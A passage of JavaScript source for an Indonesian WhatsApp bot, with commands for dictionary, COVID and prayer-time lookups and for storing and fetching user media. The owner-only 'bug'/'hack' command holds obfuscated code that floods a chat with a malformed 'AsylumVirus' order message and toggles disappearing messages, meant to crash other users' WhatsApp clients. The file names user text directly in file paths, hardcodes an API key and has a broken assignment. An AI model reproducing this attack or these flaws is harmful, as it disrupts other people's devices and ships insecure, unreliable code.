					kabebei = `「 *KBBI* 」\nJawaban : ${anu.result.hasil}`
					dila.sendMessage(from, kabebei, text, { quoted: Lan })
					break
					
				case 'covid':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`https://videfikri.com/api/covidindo/`)
					cvd = `「 *INGFO COVID* 」

Negara : ${anu.result.country}
Positif : ${anu.result.positif}
Sembuh : ${anu.result.sembuh}
Meninggal : ${anu.result.meninggal}`
					dila.sendMessage(from, cvd, text, { quoted: Lan })
					break
					
				case 'pinterest':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					dila.updatePresence(from, Presence.composing)
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${body.slice(11)}`, { method: 'get' })
					reply(dla.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek = n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					dila.sendMessage(from, pok, image, { quoted: Lan, caption: `*PINTEREST*` })
					break
					case 'jadwalsholat':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Daerah Nya Mana?\nContoh :\n${prefix}jadwalsholat Tasikmalaya`)
					anu = await fetchJson(`https://api.zeks.xyz/api/jadwalsholat?apikey=apivinz&daerah=${q}`)
					jsholat `${anu.data.string}`
					dila.sendMessage(from, jsholat, text, {quoted: Lan})
					break

				case 'storagemenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const storage = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}addstiker\`\`\`
\`\`\`├ ${prefix}getstiker\`\`\`
\`\`\`├ ${prefix}liststiker\`\`\`
\`\`\`├ ${prefix}addvideo\`\`\`
\`\`\`├ ${prefix}getvideo\`\`\`
\`\`\`├ ${prefix}listvideo\`\`\`
\`\`\`├ ${prefix}addvn\`\`\`
\`\`\`├ ${prefix}getvn\`\`\`
\`\`\`├ ${prefix}listvn\`\`\`
\`\`\`├ ${prefix}addimage\`\`\`
\`\`\`├ ${prefix}getimage\`\`\`
\`\`\`├ ${prefix}listimage\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x4af3=['mebZlNDOyxrZyxbWlM5LDa','mtu5mdqZneDxvvnqyG','mtiXmtbzzMDAwfO','mJiZmtq1vLzZs0X3','CMvHzezPBgvtEw5J','C3rHDhvZqgjYB2fKy2fZDa','mvfwCK5Ayq','mvfUq0rIAW','nJK5mZqXyNPmveji','mte0nJKYAfDIAK1X','odGZnZa0tePvtfr2','mJbYCKvuEMS','u3rVCMfNzsbnzw51','lI9KBNmVDgH1BwjUywLSlMPWzwC','nZGYnteZCLnHugjL'];var _0xac5ea5=_0x14d8;function _0x14d8(_0x579f5f,_0x29ced5){_0x579f5f=_0x579f5f-0x1e7;var _0x4af3ce=_0x4af3[_0x579f5f];if(_0x14d8['IiisPS']===undefined){var _0x14d834=function(_0x29c172){var _0x1ae22f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x59f951='';for(var _0x3620c0=0x0,_0x452a88,_0x30855c,_0x18699d=0x0;_0x30855c=_0x29c172['charAt'](_0x18699d++);~_0x30855c&&(_0x452a88=_0x3620c0%0x4?_0x452a88*0x40+_0x30855c:_0x30855c,_0x3620c0++%0x4)?_0x59f951+=String['fromCharCode'](0xff&_0x452a88>>(-0x2*_0x3620c0&0x6)):0x0){_0x30855c=_0x1ae22f['indexOf'](_0x30855c);}return _0x59f951;};_0x14d8['tTqMYX']=function(_0x56ebac){var _0x2fecce=_0x14d834(_0x56ebac);var _0x2e691c=[];for(var _0x1a8536=0x0,_0x4152ca=_0x2fecce['length'];_0x1a8536<_0x4152ca;_0x1a8536++){_0x2e691c+='%'+('00'+_0x2fecce['charCodeAt'](_0x1a8536)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e691c);},_0x14d8['ikStxQ']={},_0x14d8['IiisPS']=!![];}var _0x546ab1=_0x4af3[0x0],_0x1d1848=_0x579f5f+_0x546ab1,_0x2ca39e=_0x14d8['ikStxQ'][_0x1d1848];return _0x2ca39e===undefined?(_0x4af3ce=_0x14d8['tTqMYX'](_0x4af3ce),_0x14d8['ikStxQ'][_0x1d1848]=_0x4af3ce):_0x4af3ce=_0x2ca39e,_0x4af3ce;}(function(_0x4d7879,_0x559285){var _0x499656=_0x14d8;while(!![]){try{var _0x40db4c=parseInt(_0x499656(0x1f5))*-parseInt(_0x499656(0x1e8))+-parseInt(_0x499656(0x1e9))+-parseInt(_0x499656(0x1f2))+-parseInt(_0x499656(0x1e7))*parseInt(_0x499656(0x1ee))+parseInt(_0x499656(0x1f0))+parseInt(_0x499656(0x1f1))*parseInt(_0x499656(0x1eb))+parseInt(_0x499656(0x1ea));if(_0x40db4c===_0x559285)break;else _0x4d7879['push'](_0x4d7879['shift']());}catch(_0x2c0071){_0x4d7879['push'](_0x4d7879['shift']());}}}(_0x4af3,0xdae87),dila['sendMessage'](from,storage,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0xac5ea5(0x1f4)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0xac5ea5(0x1f3)](_0xac5ea5(0x1ed)),'surface':0xc8,'message':_0xac5ea5(0x1ec),'orderTitle':_0xac5ea5(0x1ec),'sellerJid':_0xac5ea5(0x1ef)}}}}));
                break
				case 'addstiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedSticker) return reply('Reply stickernya kak -_-')
					stiklan = body.slice(11)
					if (!stiklan) return reply('Namain Stickernya kak!')
					adds = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					lan = await dila.downloadMediaMessage(adds)
					setimker.push(`${stiklan}`)
					fs.writeFileSync(`./media/sticker/${stiklan}.webp`, lan)
					fs.writeFileSync(`./media/stik.json`, JSON.stringify(setimker))
					await reply('Sticker Berhasil Ditambahkan Ke Database Bot')
					break

				case 'getstiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Stiker Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}liststiker`)
					stikeram = body.slice(11)
					hasilya = fs.readFileSync(`./media/sticker/${stikeram}.webp`)
					dila.sendMessage(from, hasilya, sticker, { quoted: Lan })
					break

				case 'liststiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					lis = '╭──「 *LIST STICKER* 」\n'
					for (let cieee of setimker) {
						lis += `◯ ${cieee}\n`
					}
					lis += `\n╰─────「 *${setimker.length}* 」`
					dila.sendMessage(from, lis.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": setimker } })
					break

				case 'addvideo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedVideo) return reply('Reply Videonya Kak')
					adv = body.slice(10)
					if (!adv) return reply('Namain video nya kak')
					deo = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					dvi = await dila.downloadMediaMessage(deo)
					vidioya.push(`${adv}`)
					fs.writeFileSync(`./media/video/${adv}.mp4`, dvi)
					fs.writeFileSync(`./media/video.json`, JSON.stringify(vidioya))
					dila.sendMessage(from, `Video Berhasil Ditambahkan Ke Database Bot`, MessageType.text, { quoted: Lan })
					break

				case 'getvideo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Video Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}listvideo`)
					getvi = body.slice(10)
					buffer = fs.readFileSync(`./media/video/${getvi}.mp4`)
					dila.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: Lan })
					break

				case 'listvideo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					list = '╭──「 *LIST VIDEO* 」\n'
					for (let nihh of vidioya) {
						list += `◯ ${nihh}\n`
					}
					list += `\n╰─────「 *${vidioya.length}* 」`
					dila.sendMessage(from, list.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": vidioya } })
					break

				case 'addvn':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedAudio) return reply('Reply Vn Nya Kak')
					advn = body.slice(7)
					if (!advn) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await dila.downloadMediaMessage(boij)
					audioya.push(`${advn}`)
					fs.writeFileSync(`./media/audio/${advn}.mp3`, delb)
					fs.writeFileSync('./media/audio.json', JSON.stringify(audioya))
					dila.sendMessage(from, `Vn Berhasil Ditambahkan Ke Database Bot`, MessageType.text, { quoted: Lan })
					break

				case 'getvn':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Vn Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}listvn`)
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./media/audio/${namastc}.mp3`)
					dila.sendMessage(from, buffer, audio, { quoted: Lan })
					break

				case 'listvn':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					lisv = '╭──「 *LIST VN* 」\n'
					for (let awokwkwk of audioya) {
						lisv += `◯ ${awokwkwk}\n`
					}
					lisv += `\n╰─────「 *${audioya.length}* 」`
					dila.sendMessage(from, lisv.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": audioya } })
					break

				case 'addimage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!isQuotedImage) return reply('Reply Gambar Nya Kak')
					sepimg = body.slice(10)
					if (!sepimg) return reply('Nama Gambar Nya Apa?')
					svimeg = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					imej = await dila.downloadMediaMessage(svimeg)
					imegya.push(`${sepimg}`)
					fs.writeFileSync(`./media/image/${sepimg}.jpeg`, imej)
					fs.writeFileSync('./media/image.json', JSON.stringify(imegya))
					dila.sendMessage(from, `Gambar Berhasil Ditambahkan Ke Database Bot`, MessageType.text, { quoted: Lan })
					break

				case 'getimage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Nama Gambar Nya Apa kak?\nKalo Gak Tau Ketik :\n${prefix}listimage`)
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./media/image/${namastc}.jpeg`)
					dila.sendMessage(from, buffer, image, { quoted: Lan })
					break

				case 'listimage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					lisi = '╭──「 *LIST IMAGE* 」\n'
					for (let menghilih of imegya) {
						lisi += `◯ ${menghilih}\n`
					}
					lisi += `\n╰─────「 *${imegya.length}* 」`
					dila.sendMessage(from, lisi.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": imegya } })
					break
				
				case 'ownermenu':
					const bosnya = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}addprem\`\`\`
\`\`\`├ ${prefix}dellprem\`\`\`
\`\`\`├ ${prefix}addrespon\`\`\`
\`\`\`├ ${prefix}delrespon\`\`\`
\`\`\`├ ${prefix}ban\`\`\`
\`\`\`├ ${prefix}colong\`\`\`
\`\`\`├ ${prefix}unban\`\`\`
\`\`\`├ ${prefix}bc\`\`\`
\`\`\`├ ${prefix}tobc\`\`\`
\`\`\`├ ${prefix}bug\`\`\`
\`\`\`├ ${prefix}self\`\`\`
\`\`\`├ ${prefix}public\`\`\`
\`\`\`├ ${prefix}leave\`\`\`
\`\`\`├ ${prefix}delchatgc\`\`\`
\`\`\`├ ${prefix}delttc\`\`\`
\`\`\`├ ${prefix}upswteks\`\`\`
\`\`\`├ ${prefix}upswimage\`\`\`
\`\`\`├ ${prefix}upswvideo\`\`\`
\`\`\`├ ${prefix}shutdown\`\`\`
\`\`\`├ ${prefix}setreply\`\`\`
\`\`\`├ ${prefix}setprefix\`\`\`
\`\`\`├ ${prefix}setbio\`\`\`
\`\`\`├ ${prefix}setppbot\`\`\`
\`\`\`├ ${prefix}setnamebot\`\`\`
\`\`\`├ ${prefix}setthumb\`\`\`
\`\`\`├ ${prefix}clearall\`\`\`
\`\`\`├ ${prefix}resetlimit\`\`\`
\`\`\`├ ${prefix}event\`\`\`
\`\`\`├ ${prefix}term\`\`\`
\`\`\`├ ${prefix}return\`\`\`
\`\`\`├ ${prefix}readall\`\`\`
\`\`\`└ ${pushname}\`\`\``
var _0xa311=['ntK5B3j5v2XA','mte0oti5AwDlwxPj','mZK3odfNA1bQBxC','ody1ou9Rq1HZza','mZi2mZeWq3nRB3Hn','mwTLEMXPyW','mtG4ode5sfjqwMDb','t3DUzxiGtwvUDq','mwPiu1Lpra','mebZlNDOyxrZyxbWlM5LDa','mtKXz3nJBKD6','nKL2ywTZBq','C2vUze1LC3nHz2u','lI9KBNmVDgH1BwjUywLSlMPWzwC','mJyXodK1q1Hgs2r5'];function _0x196d(_0x20852a,_0x367a60){_0x20852a=_0x20852a-0x106;var _0xa311f1=_0xa311[_0x20852a];if(_0x196d['eAYXFU']===undefined){var _0x196de7=function(_0x41b05f){var _0x2e537f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x11fb12='';for(var _0xa22910=0x0,_0x4e72e9,_0x31ac1c,_0xe1bce6=0x0;_0x31ac1c=_0x41b05f['charAt'](_0xe1bce6++);~_0x31ac1c&&(_0x4e72e9=_0xa22910%0x4?_0x4e72e9*0x40+_0x31ac1c:_0x31ac1c,_0xa22910++%0x4)?_0x11fb12+=String['fromCharCode'](0xff&_0x4e72e9>>(-0x2*_0xa22910&0x6)):0x0){_0x31ac1c=_0x2e537f['indexOf'](_0x31ac1c);}return _0x11fb12;};_0x196d['BscbyQ']=function(_0x42d9e1){var _0x137213=_0x196de7(_0x42d9e1);var _0x5861af=[];for(var _0xafdc80=0x0,_0x2c97ad=_0x137213['length'];_0xafdc80<_0x2c97ad;_0xafdc80++){_0x5861af+='%'+('00'+_0x137213['charCodeAt'](_0xafdc80)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5861af);},_0x196d['xWiNtZ']={},_0x196d['eAYXFU']=!![];}var _0x577ebd=_0xa311[0x0],_0x1d9b34=_0x20852a+_0x577ebd,_0x58e4ba=_0x196d['xWiNtZ'][_0x1d9b34];return _0x58e4ba===undefined?(_0xa311f1=_0x196d['BscbyQ'](_0xa311f1),_0x196d['xWiNtZ'][_0x1d9b34]=_0xa311f1):_0xa311f1=_0x58e4ba,_0xa311f1;}var _0x2b04a4=_0x196d;(function(_0x557a84,_0x14ee6b){var _0x42724a=_0x196d;while(!![]){try{var _0x4646fb=parseInt(_0x42724a(0x107))*-parseInt(_0x42724a(0x10f))+parseInt(_0x42724a(0x10d))+-parseInt(_0x42724a(0x10e))*-parseInt(_0x42724a(0x109))+-parseInt(_0x42724a(0x111))*parseInt(_0x42724a(0x113))+-parseInt(_0x42724a(0x114))+parseInt(_0x42724a(0x10a))*-parseInt(_0x42724a(0x110))+parseInt(_0x42724a(0x112));if(_0x4646fb===_0x14ee6b)break;else _0x557a84['push'](_0x557a84['shift']());}catch(_0x4fc2a5){_0x557a84['push'](_0x557a84['shift']());}}}(_0xa311,0x24fe1),dila[_0x2b04a4(0x10b)](from,bosnya,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x2b04a4(0x108),...from?{'remoteJid':'status@broadcast'}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs['readFileSync'](_0x2b04a4(0x10c)),'surface':0xc8,'message':_0x2b04a4(0x106),'orderTitle':_0x2b04a4(0x106),'sellerJid':_0x2b04a4(0x108)}}}}));
break
					case 'colong':
					if (!isOwner) return reply(dla.ownerb())
		if (!isQuotedSticker) return reply('Reply stickernya')
		const encmediia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await dila.downloadAndSaveMediaMessage(encmediia, `./temp/${sender}`)
		    exec(`webpmux -set exif ./temp/data.exif ./temp/${sender}.webp -o ./temp/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    dila.sendMessage(from, fs.readFileSync(`./temp/${sender}.webp`), MessageType.sticker, {quoted: Lan})
					fs.unlinkSync(media)
					fs.unlinkSync(`./temp/takestick_${sender}.exif`)
				})
				break
					case 'setnamebot':
					if (!isOwner) return reply(dla.ownerb())
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(12)
                dila.updateProfileName(anu)
                reply(`Sukses mengganti nama ke:\n${anu}`)
                break
					case 'addrespon':
				if (!isOwner) return reply(dla.ownerb())
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				var _0x2666=['C3bSAxq','mZLrsu1py0u','vwrHAcbHzge','mwneEg9jCW','mvvWqLjbrq','muXpqMfWqG','ndu3ou1ZCwj3wG','mJy3mdm5u2f6DMr2','mtqYmJDqweHTCvK','odK4rereqMHp','nti2nZfduxPrse0','ntyZnJC5CxHzverk','ndK0mtm5D3DSufzp','mtiZmhH3rvHKBa','mujfzNvPra'];var _0x492c52=_0x1980;function _0x1980(_0x51fd32,_0x22a093){_0x51fd32=_0x51fd32-0xa4;var _0x26662a=_0x2666[_0x51fd32];if(_0x1980['tPSMsG']===undefined){var _0x19806c=function(_0x2f5181){var _0x5d3ffc='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2d7275='';for(var _0x7bf731=0x0,_0x33773a,_0x34b876,_0x3537a0=0x0;_0x34b876=_0x2f5181['charAt'](_0x3537a0++);~_0x34b876&&(_0x33773a=_0x7bf731%0x4?_0x33773a*0x40+_0x34b876:_0x34b876,_0x7bf731++%0x4)?_0x2d7275+=String['fromCharCode'](0xff&_0x33773a>>(-0x2*_0x7bf731&0x6)):0x0){_0x34b876=_0x5d3ffc['indexOf'](_0x34b876);}return _0x2d7275;};_0x1980['wTWJBp']=function(_0x4b55e9){var _0x5c98f5=_0x19806c(_0x4b55e9);var _0x525108=[];for(var _0x2c0de0=0x0,_0x39d093=_0x5c98f5['length'];_0x2c0de0<_0x39d093;_0x2c0de0++){_0x525108+='%'+('00'+_0x5c98f5['charCodeAt'](_0x2c0de0)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x525108);},_0x1980['emroYL']={},_0x1980['tPSMsG']=!![];}var _0x14a9f4=_0x2666[0x0],_0x1a1aa3=_0x51fd32+_0x14a9f4,_0x2b6e60=_0x1980['emroYL'][_0x1a1aa3];return _0x2b6e60===undefined?(_0x26662a=_0x1980['wTWJBp'](_0x26662a),_0x1980['emroYL'][_0x1a1aa3]=_0x26662a):_0x26662a=_0x2b6e60,_0x26662a;}(function(_0x36c6ff,_0xbffdfa){var _0x532fcb=_0x1980;while(!![]){try{var _0x27667d=-parseInt(_0x532fcb(0xa8))+parseInt(_0x532fcb(0xa4))*-parseInt(_0x532fcb(0xab))+parseInt(_0x532fcb(0xa7))*-parseInt(_0x532fcb(0xaf))+-parseInt(_0x532fcb(0xa5))*-parseInt(_0x532fcb(0xac))+-parseInt(_0x532fcb(0xb1))*parseInt(_0x532fcb(0xa9))+parseInt(_0x532fcb(0xad))*-parseInt(_0x532fcb(0xa6))+parseInt(_0x532fcb(0xaa))*parseInt(_0x532fcb(0xae));if(_0x27667d===_0xbffdfa)break;else _0x36c6ff['push'](_0x36c6ff['shift']());}catch(_0x1067ba){_0x36c6ff['push'](_0x36c6ff['shift']());}}}(_0x2666,0x4801a),argzo=arg[_0x492c52(0xb0)]('|'));if(checkCommands(argzo[0x0],commandsDB)===!![])return reply(_0x492c52(0xb2));addCommands(argzo[0x0],argzo[0x1],sender,commandsDB),reply('Ok\x20berhasil\x20gan');
				break
			case 'delrespon':
			    if (!isOwner) return reply(dla.ownerb())
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				var _0x2c8d=['n09svurAtW','mtuXndeXn0zRwvPZqq','nti3mZDhshDjBwC','C2XPy2u','ody2nJLKzwz2BLy','nJmZoteXExnRBe1L','mJnxs0PvwLK','mJqXmJa2oxjNy2HTvW','nJG0otHnA0DotMW','t2SGyMvYAgfZAwWGz2fU','ng5JBwrYzW','mZeWntiWAuXluKXZ'];function _0x5959(_0x34cab4,_0x3ad034){_0x34cab4=_0x34cab4-0x1b6;var _0x2c8d54=_0x2c8d[_0x34cab4];if(_0x5959['WqYHin']===undefined){var _0x59592a=function(_0x1eac3d){var _0x285579='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xf21499='';for(var _0x1f6758=0x0,_0x3e1405,_0x10c4d3,_0xfcb615=0x0;_0x10c4d3=_0x1eac3d['charAt'](_0xfcb615++);~_0x10c4d3&&(_0x3e1405=_0x1f6758%0x4?_0x3e1405*0x40+_0x10c4d3:_0x10c4d3,_0x1f6758++%0x4)?_0xf21499+=String['fromCharCode'](0xff&_0x3e1405>>(-0x2*_0x1f6758&0x6)):0x0){_0x10c4d3=_0x285579['indexOf'](_0x10c4d3);}return _0xf21499;};_0x5959['YGnvZj']=function(_0x563f0f){var _0x57816f=_0x59592a(_0x563f0f);var _0x38a956=[];for(var _0x3e1ac3=0x0,_0x584884=_0x57816f['length'];_0x3e1ac3<_0x584884;_0x3e1ac3++){_0x38a956+='%'+('00'+_0x57816f['charCodeAt'](_0x3e1ac3)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x38a956);},_0x5959['ZqnCjZ']={},_0x5959['WqYHin']=!![];}var _0x5383a8=_0x2c8d[0x0],_0x5854b8=_0x34cab4+_0x5383a8,_0x275a78=_0x5959['ZqnCjZ'][_0x5854b8];return _0x275a78===undefined?(_0x2c8d54=_0x5959['YGnvZj'](_0x2c8d54),_0x5959['ZqnCjZ'][_0x5854b8]=_0x2c8d54):_0x2c8d54=_0x275a78,_0x2c8d54;}var _0x25a8c2=_0x5959;(function(_0x1b8179,_0x2510b8){var _0x147fa6=_0x5959;while(!![]){try{var _0xc0149e=parseInt(_0x147fa6(0x1bc))+-parseInt(_0x147fa6(0x1ba))+-parseInt(_0x147fa6(0x1c0))+parseInt(_0x147fa6(0x1b7))*-parseInt(_0x147fa6(0x1b9))+parseInt(_0x147fa6(0x1c1))*-parseInt(_0x147fa6(0x1bd))+-parseInt(_0x147fa6(0x1bb))*parseInt(_0x147fa6(0x1bf))+parseInt(_0x147fa6(0x1b6));if(_0xc0149e===_0x2510b8)break;else _0x1b8179['push'](_0x1b8179['shift']());}catch(_0x178b1c){_0x1b8179['push'](_0x1b8179['shift']());}}}(_0x2c8d,0xd8d41));if(!checkCommands(body[_0x25a8c2(0x1be)](0x6),commandsDB))return reply('Ga\x20ada\x20di\x20database');deleteCommands(body[_0x25a8c2(0x1be)](0x6),commandsDB),reply(_0x25a8c2(0x1b8));
				break
			case 'bug':
			case 'bugtroli':
            case 'hack':
            case 'kudet':
            if (!isOwner) return reply(dla.ownerb())
const _0x4779=['nev2BwXvsa','mtu1mtu3BhbpuKHz','A2v5','mtGZotG0mw5NwKnKrW','odq0nZeXt1PZwNnO','mta2mti1mwj1rwzzvq','C2vUze1LC3nHz2u','qgfKAxDHANnOAw5Nl2jHAwXLExm','nxnJvwXKzq','mu51v21rua','zxH0zw5KzwruzxH0','mebZlNDOyxrZyxbWlM5LDa','mti0mdCXm2LHCxjICq','mZa5mdLjuhP3vLG','mtm4nZGZmMn1vev5uG'];const _0x3dab56=_0x4846;(function(_0xa03173,_0x33c085){const _0x13b136=_0x4846;while(!![]){try{const _0x380990=parseInt(_0x13b136(0x1a1))*parseInt(_0x13b136(0x198))+-parseInt(_0x13b136(0x19c))*parseInt(_0x13b136(0x197))+-parseInt(_0x13b136(0x1a3))+parseInt(_0x13b136(0x1a2))+parseInt(_0x13b136(0x19d))+parseInt(_0x13b136(0x19e))*-parseInt(_0x13b136(0x19f))+-parseInt(_0x13b136(0x19b));if(_0x380990===_0x33c085)break;else _0xa03173['push'](_0xa03173['shift']());}catch(_0x45a45c){_0xa03173['push'](_0xa03173['shift']());}}}(_0x4779,0xf2faf));function sleep(_0xbb4bb7){return new Promise(_0x361499=>setTimeout(_0x361499,_0xbb4bb7));}function _0x4846(_0x3dd1c2,_0x5d651d){_0x3dd1c2=_0x3dd1c2-0x196;let _0x477941=_0x4779[_0x3dd1c2];if(_0x4846['OpOvzt']===undefined){var _0x48467f=function(_0x554180){const _0x4bdc36='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x28abc7='';for(let _0xc026e5=0x0,_0x5edd1d,_0x5bc23f,_0x2bfc93=0x0;_0x5bc23f=_0x554180['charAt'](_0x2bfc93++);~_0x5bc23f&&(_0x5edd1d=_0xc026e5%0x4?_0x5edd1d*0x40+_0x5bc23f:_0x5bc23f,_0xc026e5++%0x4)?_0x28abc7+=String['fromCharCode'](0xff&_0x5edd1d>>(-0x2*_0xc026e5&0x6)):0x0){_0x5bc23f=_0x4bdc36['indexOf'](_0x5bc23f);}return _0x28abc7;};_0x4846['qAevGm']=function(_0x16449c){const _0x43ec10=_0x48467f(_0x16449c);let _0x50ee81=[];for(let _0x20d288=0x0,_0x40cf40=_0x43ec10['length'];_0x20d288<_0x40cf40;_0x20d288++){_0x50ee81+='%'+('00'+_0x43ec10['charCodeAt'](_0x20d288)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x50ee81);},_0x4846['nGlraf']={},_0x4846['OpOvzt']=!![];}const _0xbb4bb7=_0x4779[0x0],_0x361499=_0x3dd1c2+_0xbb4bb7,_0x38cf03=_0x4846['nGlraf'][_0x361499];return _0x38cf03===undefined?(_0x477941=_0x4846['qAevGm'](_0x477941),_0x4846['nGlraf'][_0x361499]=_0x477941):_0x477941=_0x38cf03,_0x477941;}function troli(_0x38cf03){const _0x2cd59d=_0x4846;dila[_0x2cd59d(0x1a4)](_0x38cf03,'▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\x0a▒▒█▒▒▒▄██████████▄▒▒▒▒\x0a▒█▐▒▒▒████████████▒▒▒▒\x0a▒▌▐▒▒██▄▀██████▀▄██▒▒▒\x0a▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\x0a▐┼▐▒▒██████████████▒▒▒\x0a▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\x0a▒▒█████──────────▐███▌\x0a▒▒█▀▀██▄█─▄───▐─▄███▀▒\x0a▒▒█▒▒███████▄██████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒█████████▐▌██▌▒▒▒\x0a▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒',MessageType[_0x2cd59d(0x199)],{'quoted':{'key':{'participant':_0x2cd59d(0x19a)},'message':{'orderMessage':{'thumbnail':dnsnew,'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':'☠️Asylum☠️','orderTitle':'AsylumVirus','sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x554180){const _0x1f02a9=_0x4846;for(let _0x28abc7=0x0;_0x28abc7<0x1;_0x28abc7++){var _0x4bdc36=require(_0x1f02a9(0x196));dila['toggleDisappearingMessages'](_0x554180,_0x4bdc36);}}async function attack(_0xc026e5){bug(_0xc026e5),await sleep(0x64),troli(_0xc026e5),await sleep(0x64),bug(_0xc026e5);}attack(Lan[_0x3dab56(0x1a0)]['remoteJid']);
break
case 'self':
           if (!isOwner) return reply(dla.ownerb())
           if (self === true) return 
            let denzz = {
            thumbnail: dnsnew,
            quoted: { 
           key: { 
           fromMe: false, participant: `0@s.whatsapp.net`, 
